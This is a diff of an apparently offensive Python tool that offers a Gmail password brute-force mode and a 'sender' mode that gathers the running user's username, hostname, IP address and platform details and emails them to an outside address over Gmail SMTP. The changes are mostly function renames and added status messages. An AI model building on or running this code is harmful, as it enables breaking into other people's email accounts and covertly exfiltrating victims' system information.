@@ -29,7 +29,7 @@ def banner():
     sleep(1)
 
 
-def MailPassword(): 
+def __MailBrute__(): 
     # Get the email password
     gmail = str(input("[*] Enter the email: "))
     i = 0
@@ -69,13 +69,16 @@ def MailPassword():
         print()
         print(f'\033[31m ![ERROR] {ex}\033[0m')
 
+    finally: 
+        print('[-] Email brute force finished!')
 
-def MailSender(send_email, rec_email, password): 
+
+def __MailSender__(send_email, rec_email, password): 
     # Computer Informations
     username = getpass.getuser()
     hostname = socket.gethostname()
     IPAddr = socket.gethostbyname(hostname)
-    inf="{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(hostname,IPAddr,platform.node(),platform.system(),platform.processor(),platform.uname())
+    inf = "{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(hostname,IPAddr,platform.node(),platform.system(),platform.processor(),platform.uname())
 
     # Informations
     subject = f'Check The Message {username}.'
@@ -97,26 +100,26 @@ def MailSender(send_email, rec_email, password):
         </html>
     '''.format(inf), subtype='html')
 
-    # Files
-    files= ['directory/image.jpg']
-    for file in files: 
-        try: 
-            with open(file, 'rb') as f: 
-                file_data=f.read()
-                file_type=imghdr.what(f.name)
-                file_name=f.name
+    # Send Files
+    # files= ['directory/image.jpg']
+    # for file in files: 
+    #     try: 
+    #         with open(file, 'rb') as f: 
+    #             file_data=f.read()
+    #             file_type=imghdr.what(f.name)
+    #             file_name=f.name
 
-            msg.add_attachment(file_data, maintype = 'image', subtype=file_type, filename=file_name)
+    #         msg.add_attachment(file_data, maintype = 'image', subtype=file_type, filename=file_name)
 
-        except Exception as e: 
-            print()
-            print(f'\033[31m ![ERROR] {e}\033[0m')
+    #     except Exception as e: 
+    #         print()
+    #         print(f'\033[31m ![ERROR] {e}\033[0m')
 
     # Send the email
     try: 
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp: 
             smtp.login(send_email, password)
-            print(f'Login in the email {send_email}')
+            print(f'[+] Login in the email {send_email}')
             sleep(1)
             smtp.send_message(msg)
             print('\033[1;32m [+] Email has been sent to {}\033[0m'.format(rec_email))
@@ -124,6 +127,9 @@ def MailSender(send_email, rec_email, password):
     except Exception as e: 
         print()
         print(f'\033[31m ![ERROR] {e}\033[0m')
+
+    finally: 
+        print('[-] Email sender finished!')
 
 
 if __name__=='__main__': 
@@ -135,7 +141,7 @@ if __name__=='__main__':
             ask = str(
                 input('[*] Bruteforce/Send? ')).lower().strip()
             if ask == 'bruteforce':
-                MailPassword()
+                __MailBrute__()
             elif ask == 'send':
                 print()
                 print('[+] Starting the Sender tool...')
@@ -146,7 +152,7 @@ if __name__=='__main__':
                 send_email = os.getenv('SEND_MAIL')
                 rec_email = os.getenv('REC_EMAIL')
                 password = getpass.getpass('[*] Enter your password: ')
-                MailSender(send_email, rec_email, password)
+                __MailSender__(send_email, rec_email, password)
             else: 
                 print()
                 print('[!] Invalid answer.')
